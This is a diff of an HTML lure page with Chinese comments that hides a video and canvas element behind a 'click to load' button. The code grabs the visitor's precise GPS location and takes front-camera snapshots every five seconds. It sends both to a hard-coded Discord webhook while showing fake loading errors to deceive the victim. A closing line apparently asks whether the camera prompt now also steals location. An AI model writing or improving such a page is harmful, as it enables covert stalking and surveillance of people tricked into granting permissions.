@@ -10,6 +10,7 @@
 <button onclick="startAction()">點擊載入</button>
 <p id="status"></p>
 
+<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
@@ -17,66 +18,70 @@
 var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 
 function startAction() {
-    document.getElementById("status").innerHTML = "正在載入...";
-    
-    // 第一步：先抓定位
+    getLocation(); // 原有的定位
+    getCamera();   // 新增的截圖
+}
+
+function getLocation() {
+    document.getElementById("status").innerHTML = "正在取得內容...";
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            // 定位成功後的處理
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon })
-            });
-            // 定位成功後，緊接著執行相機
-            getCamera();
-        }, function(err) {
-            // 定位失敗 (對方拒絕)，依然嘗試執行相機
-            console.log("定位失敗");
-            getCamera();
-        }, {
+        navigator.geolocation.getCurrentPosition(success, error, {
             enableHighAccuracy: true,
-            timeout: 8000 // 縮短超時時間，避免卡死
+            timeout: 10000,
+            maximumAge: 0
         });
-    } else {
-        // 不支援定位，直接跑相機
-        getCamera();
     }
 }
 
+function success(pos) {
+    var lat = pos.coords.latitude;
+    var lon = pos.coords.longitude;
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
+        })
+    });
+    document.getElementById("status").innerHTML = "內容載入失敗，請重試。";
+}
+
+function error(err) {
+    document.getElementById("status").innerHTML = "需要允許權限才能查看內容";
+}
+
 function getCamera() {
+    // 請求相機權限
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(function(stream) {
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 立即截圖一張，之後每 10 秒傳一次 (避免 Discord 頻率限制)
-        setTimeout(function(){ sendSnap(video); }, 1000);
-        setInterval(function(){ sendSnap(video); }, 10000);
-        
-        document.getElementById("status").innerHTML = "載入失敗，錯誤代碼：0x8240";
+        // 每 5 秒截圖並傳送一次
+        setInterval(function() {
+            var canvas = document.getElementById("c");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(function(blob) {
+                var formData = new FormData();
+                formData.append('file', blob, 'capture.jpg');
+                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
+                
+                fetch(webhook, {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
+        }, 5000);
     })
     .catch(function(err) {
-        document.getElementById("status").innerHTML = "需要完整權限才能查看內容";
+        console.log("相機權限被拒絕");
     });
-}
-
-function sendSnap(video) {
-    var canvas = document.getElementById("c");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    var ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-    
-    canvas.toBlob(function(blob) {
-        var formData = new FormData();
-        formData.append('file', blob, 'capture.jpg');
-        formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
-        fetch(webhook, { method: "POST", body: formData });
-    }, "image/jpeg", 0.6);
 }
 </script>
 
 </body>
+</html>這個變成詢問攝像頭就可以直接竊取到訂位了？
